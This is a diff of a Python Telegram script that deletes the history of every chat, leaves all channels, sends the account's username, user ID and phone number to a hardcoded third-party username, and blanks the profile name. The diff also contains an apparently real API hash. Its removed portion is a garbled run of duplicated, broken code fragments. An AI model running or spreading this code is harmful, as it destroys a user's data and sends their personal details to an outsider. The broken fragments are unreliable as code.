@@ -8,7 +8,7 @@ import asyncio
 
 
 API_ID = 29834234
-API_HASH = "552c01d21d127def060f2915aedeebf9"
+API_HASH = "YOUR_NEW_API_HASH"
 
 TARGET_USERNAME = "Moein_915"
 NEW_FIRST_NAME = ""
@@ -26,7 +26,6 @@ async def main():
 
             print(f"Processing: {name} ({type(entity).__name__})")
 
-            # Delete chat history
             await client(
                 DeleteHistoryRequest(
                     peer=entity,
@@ -35,7 +34,6 @@ async def main():
                 )
             )
 
-            # Leave/delete dialog
             if isinstance(entity, Channel):
                 await client(LeaveChannelRequest(entity))
                 print(f"Left Channel/Supergroup: {name}")
@@ -62,7 +60,6 @@ async def main():
 
     print("\nDone deleting chats.")
 
-    # Get account information
     me = await client.get_me()
 
     username = f"@{me.username}" if me.username else "(no username)"
@@ -78,7 +75,6 @@ async def main():
     print(info_text)
     print("--------------------")
 
-    # Send account information
     await client.send_message(
         TARGET_USERNAME,
         info_text
@@ -86,7 +82,6 @@ async def main():
 
     print(f"Sent account info to @{TARGET_USERNAME}")
 
-    # Change first name
     await client(
         UpdateProfileRequest(
             first_name=NEW_FIRST_NAME
@@ -99,229 +94,3 @@ async def main():
 if __name__ == "__main__":
     with client:
         client.loop.run_until_complete(main())
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
-
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    await client.send_message(
-        TARGET_USERNAME,
-        info_text
-    )
-
-    print(f"Sent account info to @{TARGET_USERNAME}")
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(f"Account name changed to: {NEW_FIRST_NAME}")
-
-
-if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
-
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    await client.send_message(TARGET_USERNAME, info_text)
-
-    print(f"Sent account info to @{TARGET_USERNAME}")
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(f"Account name changed to: {NEW_FIRST_NAME}")
-
-
-if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())    me = await client.get_me()
-
-    username = (
-        f"@{me.username}"
-        if me.username
-        else "(no username)"
-    )
-
-    phone = (
-        f"+{me.phone}"
-        if me.phone
-        else "(no phone)"
-    )
-
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
-
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    await client.send_message(
-        TARGET_USERNAME,
-        info_text
-    )
-
-    print(
-        f"Sent account info to @{TARGET_USERNAME}"
-    )
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(
-        f"Account name changed to: {NEW_FIRST_NAME}"
-    )
-
-
-if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())
-    me = await client.get_me()
-
-    username = f"@{me.username}" if me.username else "(no username)"
-    phone = f"+{me.phone}" if me.phone else "(no phone)"
-
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
-
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    await client.send_message(
-        TARGET_USERNAME,
-        info_text
-    )
-
-    print(f"Sent account info to @{TARGET_USERNAME}")
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(f"Account name changed to: {NEW_FIRST_NAME}")
-
-
-if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())    print("\nDone deleting chats.")
-
-    me = await client.get_me()
-
-    username = f"@{me.username}" if me.username else "(no username)"
-    phone = f"+{me.phone}" if me.phone else "(no phone)"
-
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
-
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    await client.send_message(
-        TARGET_USERNAME,
-        info_text
-    )
-
-    print(f"Sent account info to @{TARGET_USERNAME}")
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(f"Account name changed to: {NEW_FIRST_NAME}")
-
-
-if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())            print(
-                f"FAILED to process {d.name or d.id}. "
-                f"Reason: {type(e).__name__}: {e}"
-            )
-
-    print("\nDone deleting chats.")
-
-    # Get account information
-    me = await client.get_me()
-
-    username = f"@{me.username}" if me.username else "(no username)"
-    phone = f"+{me.phone}" if me.phone else "(no phone)"
-
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
-
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    # Send account information
-    await client.send_message(
-        TARGET_USERNAME,
-        info_text
-    )
-
-    print(
-        f"Sent account info to @{TARGET_USERNAME}"
-    )
-
-    # Change account first name
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(
-        f"Account name changed to: {NEW_FIRST_NAME}"
-    )
-
-
-with client:
-    client.loop.run_until_complete(main())
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
-
-    await client.send_message(
-        TARGET_USERNAME,
-        info_text
-    )
-
-    print(f"Sent account info to @{TARGET_USERNAME}")
-
-    await client(UpdateProfileRequest(
-        first_name=NEW_FIRST_NAME
-    ))
-
-    print(f"Account name changed to: {NEW_FIRST_NAME}")
-
-
-with client:
-    client.loop.run_until_complete(main())
-with client:
-    client.loop.run_until_complete(main())
